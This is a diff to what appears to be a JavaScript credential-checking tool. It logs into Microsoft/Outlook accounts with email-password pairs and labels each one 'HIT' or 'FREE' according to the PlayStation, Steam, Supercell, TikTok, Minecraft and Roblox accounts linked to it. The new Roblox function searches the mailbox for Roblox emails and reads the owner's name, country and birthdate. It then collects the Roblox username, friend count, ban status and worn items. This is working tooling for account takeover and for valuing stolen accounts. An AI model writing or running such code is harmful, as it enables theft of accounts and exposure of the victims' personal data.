@@ -316,7 +316,7 @@ async function doCheck(input, res) {
     };
 
     // Check Microsoft subscriptions
-    if (['microsoft', 'both', 'all'].includes(checkMode)) {
+    if (checkMode === 'microsoft' || checkMode === 'both' || checkMode === 'all') {
       const msResult = await checkMicrosoftSubscriptions(email, password, accessToken, cid, sessionCookies);
       result.ms_status = msResult.status || 'FREE';
       result.subscriptions = msResult.subscriptions || [];
@@ -324,39 +324,65 @@ async function doCheck(input, res) {
     }
 
     // Check PSN
-    if (['psn', 'both', 'all'].includes(checkMode)) {
+    if (checkMode === 'psn' || checkMode === 'both' || checkMode === 'all') {
       const psnResult = await checkPSN(email, accessToken, cid, sessionCookies);
       result.psn_status = psnResult.psn_status || 'FREE';
       result.psn_orders = psnResult.psn_orders || 0;
     }
 
     // Check Steam
-    if (['steam', 'both', 'all'].includes(checkMode)) {
+    if (checkMode === 'steam' || checkMode === 'both' || checkMode === 'all') {
       const steamResult = await checkSteam(email, accessToken, cid, sessionCookies);
       result.steam_status = steamResult.steam_status || 'FREE';
       result.steam_count = steamResult.steam_count || 0;
     }
 
     // Check Supercell
-    if (['supercell', 'both', 'all'].includes(checkMode)) {
+    if (checkMode === 'supercell' || checkMode === 'both' || checkMode === 'all') {
       const scResult = await checkSupercell(email, accessToken, cid, sessionCookies);
       result.supercell_status = scResult.supercell_status || 'FREE';
       result.supercell_games = scResult.games || [];
     }
 
     // Check TikTok
-    if (['tiktok', 'both', 'all'].includes(checkMode)) {
+    if (checkMode === 'tiktok' || checkMode === 'both' || checkMode === 'all') {
       const ttResult = await checkTikTok(email, accessToken, cid, sessionCookies);
       result.tiktok_status = ttResult.tiktok_status || 'FREE';
       result.tiktok_username = ttResult.username || null;
     }
 
     // Check Minecraft
-    if (['minecraft', 'both', 'all'].includes(checkMode)) {
+    if (checkMode === 'minecraft' || checkMode === 'both' || checkMode === 'all') {
       const mcResult = await checkMinecraft(accessToken);
       result.minecraft_status = mcResult.minecraft_status || 'FREE';
       result.minecraft_username = mcResult.minecraft_username || null;
       result.minecraft_uuid = mcResult.minecraft_uuid || '';
+    }
+
+    // Check Roblox - ONLY when mode is 'roblox' or 'all'
+    if (checkMode === 'roblox') {
+      // ONLY Roblox check, no other services
+      const robloxResult = await checkRoblox(email, password, accessToken, cid, sessionCookies);
+      result.roblox_status = robloxResult.roblox_status || 'FREE';
+      result.roblox_username = robloxResult.username || null;
+      result.roblox_friends = robloxResult.friends || 0;
+      result.roblox_created = robloxResult.created || null;
+      result.roblox_profile = robloxResult.profile || null;
+      result.roblox_wearing = robloxResult.wearing || [];
+      result.roblox_banned = robloxResult.banned || null;
+      return res.json(result);
+    }
+    
+    if (checkMode === 'all') {
+      // All services including Roblox
+      const robloxResult = await checkRoblox(email, password, accessToken, cid, sessionCookies);
+      result.roblox_status = robloxResult.roblox_status || 'FREE';
+      result.roblox_username = robloxResult.username || null;
+      result.roblox_friends = robloxResult.friends || 0;
+      result.roblox_created = robloxResult.created || null;
+      result.roblox_profile = robloxResult.profile || null;
+      result.roblox_wearing = robloxResult.wearing || [];
+      result.roblox_banned = robloxResult.banned || null;
     }
 
     return res.json(result);
@@ -535,6 +561,264 @@ async function checkMinecraft(accessToken) {
     }
   }
   return { minecraft_status: 'FREE', minecraft_username: null };
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// ROBLOX CHECK FUNCTION - Based on Roblox By @Tesulm.py
+// ─────────────────────────────────────────────────────────────────────────────
+async function checkRoblox(email, password, accessToken, cid, sessionCookies) {
+  // Search for Roblox emails in Outlook
+  const robloxSearchUrl = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124';
+  
+  const searchPayload = {
+    Cvid: generateUUID(),
+    Scenario: { Name: 'owa.react' },
+    TimeZone: 'United Kingdom Standard Time',
+    TextDecorations: 'Off',
+    EntityRequests: [{
+      EntityType: 'Conversation',
+      ContentSources: ['Exchange'],
+      Filter: { Or: [
+        { Term: { DistinguishedFolderName: 'msgfolderroot' } },
+        { Term: { DistinguishedFolderName: 'DeletedItems' } }
+      ]},
+      From: 0,
+      Query: { QueryString: 'no-reply@roblox.com' },
+      RefiningQueries: null,
+      Size: 25,
+      Sort: [
+        { Field: 'Score', SortDirection: 'Desc', Count: 3 },
+        { Field: 'Time', SortDirection: 'Desc' }
+      ],
+      EnableTopResults: true,
+      TopResultsCount: 3
+    }],
+    AnswerEntityRequests: [{
+      Query: { QueryString: 'Playstation Sony' },
+      EntityTypes: ['Event', 'File'],
+      From: 0,
+      Size: 100,
+      EnableAsyncResolution: true
+    }],
+    QueryAlterationOptions: {
+      EnableSuggestion: true,
+      EnableAlteration: true,
+      SupportedRecourseDisplayTypes: ['Suggestion', 'NoResultModification', 'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification']
+    },
+    LogicalId: '446c567a-02d9-b739-b9ca-616e0d45905c'
+  };
+
+  const searchHeaders = {
+    'User-Agent': 'Outlook-Android/2.0',
+    'Pragma': 'no-cache',
+    'Accept': 'application/json',
+    'ForceSync': 'false',
+    'Authorization': `Bearer ${accessToken}`,
+    'X-AnchorMailbox': `CID:${cid}`,
+    'Host': 'substrate.office.com',
+    'Connection': 'Keep-Alive',
+    'Accept-Encoding': 'gzip',
+    'Content-Type': 'application/json'
+  };
+
+  const searchResponse = await sessionRequest(robloxSearchUrl, 'POST', searchHeaders, JSON.stringify(searchPayload), sessionCookies, true);
+
+  if (searchResponse.status !== 200) {
+    return { roblox_status: 'FREE', username: null, friends: 0, created: null, profile: null, wearing: [], banned: null };
+  }
+
+  let searchText = searchResponse.text;
+  let robloxUsername = extractRobloxUsername(searchText);
+  let totalRobloxFree = 0;
+
+  // Parse Total from response
+  const totalMatch = searchText.match(/"Total":\s*(\d+)/);
+  if (totalMatch) {
+    totalRobloxFree = parseInt(totalMatch[1]);
+  }
+
+  // Get profile data
+  let name = '';
+  let country = '';
+  let birthdate = 'N/A';
+
+  const profileUrl = 'https://substrate.office.com/profileb2/v2.0/me/V1Profile';
+  const profileHeaders = {
+    'User-Agent': 'Outlook-Android/2.0',
+    'Pragma': 'no-cache',
+    'Accept': 'application/json',
+    'ForceSync': 'false',
+    'Authorization': `Bearer ${accessToken}`,
+    'X-AnchorMailbox': `CID:${cid}`,
+    'Host': 'substrate.office.com',
+    'Connection': 'Keep-Alive',
+    'Accept-Encoding': 'gzip'
+  };
+
+  const profileResponse = await sessionRequest(profileUrl, 'GET', profileHeaders, null, sessionCookies, true);
+  if (profileResponse.status === 200) {
+    try {
+      const profileData = JSON.parse(profileResponse.text);
+      if (profileData.accounts && profileData.accounts.length > 0) {
+        const firstAccount = profileData.accounts[0];
+        country = firstAccount.location || '';
+        const bd = firstAccount.birthDay;
+        const bm = firstAccount.birthMonth;
+        const by = firstAccount.birthYear;
+        if (bd && bm && by) {
+          birthdate = `${by}-${String(bm).padStart(2, '0')}-${String(bd).padStart(2, '0')}`;
+        }
+      }
+      if (profileData.names && profileData.names.length > 0) {
+        name = profileData.names[0].displayName || '';
+      }
+    } catch {}
+  }
+
+  // If we found a Roblox username, get more details
+  if (robloxUsername && totalRobloxFree > 0) {
+    const robloxData = await getRobloxUserData(robloxUsername);
+    if (robloxData) {
+      const wearingStr = robloxData.wearing.join(', ');
+      return {
+        roblox_status: 'HIT',
+        username: robloxData.username,
+        friends: robloxData.friends,
+        created: robloxData.created,
+        profile: robloxData.profile,
+        wearing: robloxData.wearing,
+        banned: robloxData.banned
+      };
+    }
+  }
+
+  // Return basic info even without Roblox username
+  return {
+    roblox_status: totalRobloxFree > 0 ? 'FOUND' : 'FREE',
+    username: robloxUsername || name.split(' ')[0] || null,
+    friends: 0,
+    created: null,
+    profile: null,
+    wearing: [],
+    banned: null
+  };
+}
+
+// Extract Roblox username from search text
+function extractRobloxUsername(searchText) {
+  const patterns = [
+    /account:\s*([a-zA-Z0-9_]+)/i,
+    /for\s+([a-zA-Z0-9_]+)\s+and\s+want/i,
+    /account:\s*([a-zA-Z0-9_]+)\./i,
+    /for\s+([a-zA-Z0-9_]+)\.\s+If/i
+  ];
+  
+  for (const pattern of patterns) {
+    const match = searchText.match(pattern);
+    if (match) {
+      return match[1];
+    }
+  }
+  return null;
+}
+
+// Get Roblox user data
+async function getRobloxUserData(username) {
+  try {
+    // Get user ID from username
+    const userIdUrl = 'https://users.roblox.com/v1/usernames/users';
+    const userIdResponse = await fetch(userIdUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
+    });
+    
+    if (userIdResponse.status !== 200) return null;
+    
+    const userIdData = await userIdResponse.json();
+    if (!userIdData.data || userIdData.data.length === 0) return null;
+    
+    const userId = userIdData.data[0].id;
+    
+    // Get user details
+    const userUrl = `https://users.roblox.com/v1/users/${userId}`;
+    const userResponse = await fetch(userUrl);
+    if (userResponse.status !== 200) return null;
+    
+    const userData = await userResponse.json();
+    const isBanned = userData.isBanned || false;
+    const created = userData.created ? userData.created.split('T')[0] : 'Unknown';
+    
+    // Get friends count
+    const friendsUrl = `https://friends.roblox.com/v1/users/${userId}/friends/count`;
+    const friendsResponse = await fetch(friendsUrl);
+    let friendsCount = 0;
+    if (friendsResponse.status === 200) {
+      const friendsData = await friendsResponse.json();
+      friendsCount = friendsData.count || 0;
+    }
+    
+    const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
+    
+    // Get currently wearing
+    const wearingUrl = `https://avatar.roblox.com/v1/users/${userId}/currently-wearing`;
+    const wearingResponse = await fetch(wearingUrl);
+    let wearing = [];
+    if (wearingResponse.status === 200) {
+      const wearingData = await wearingResponse.json();
+      const assetIds = wearingData.assetIds || [];
+      if (assetIds.length > 0) {
+        wearing = await getAssetNames(assetIds);
+      }
+    }
+    
+    return {
+      username: username,
+      friends: friendsCount,
+      banned: isBanned,
+      created: created,
+      profile: profileUrl,
+      wearing: wearing
+    };
+  } catch {
+    return null;
+  }
+}
+
+// Get asset names from Roblox catalog
+async function getAssetNames(assetIds) {
+  if (!assetIds || assetIds.length === 0) return [];
+  
+  try {
+    const catalogUrl = 'https://catalog.roblox.com/v1/catalog/items/details';
+    
+    // First get CSRF token
+    const csrfResponse = await fetch(catalogUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ items: [] })
+    });
+    const csrfToken = csrfResponse.headers.get('x-csrf-token');
+    
+    if (!csrfToken) return [];
+    
+    const items = assetIds.map(id => ({ itemType: 'Asset', id: parseInt(id) }));
+    const itemResponse = await fetch(catalogUrl, {
+      method: 'POST',
+      headers: { 
+        'Content-Type': 'application/json',
+        'x-csrf-token': csrfToken
+      },
+      body: JSON.stringify({ items: items })
+    });
+    
+    if (itemResponse.status !== 200) return [];
+    
+    const itemData = await itemResponse.json();
+    return itemData.data.map(item => item.name || 'Unknown Item');
+  } catch {
+    return [];
+  }
 }
 
 async function checkMicrosoftSubscriptions(email, password, accessToken, cid, sessionCookies) {
